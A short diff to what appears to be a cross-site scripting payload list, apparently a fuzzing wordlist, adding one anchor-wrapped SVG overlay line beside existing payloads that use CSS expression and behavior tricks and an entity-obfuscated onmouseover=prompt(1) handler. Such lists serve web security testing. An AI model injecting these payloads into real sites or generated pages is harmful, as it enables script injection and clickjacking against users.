@@ -27,3 +27,4 @@ exp/*<XSS STYLE='no\xss:noxss("*//*");
 <x style="background:url('x&#1;;color:red;/*')">XXX</x>
 <x style="behavior:url(%(sct)s)">
 <a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a id="x"><rect fill="white" width="1000" height="1000"/></a>
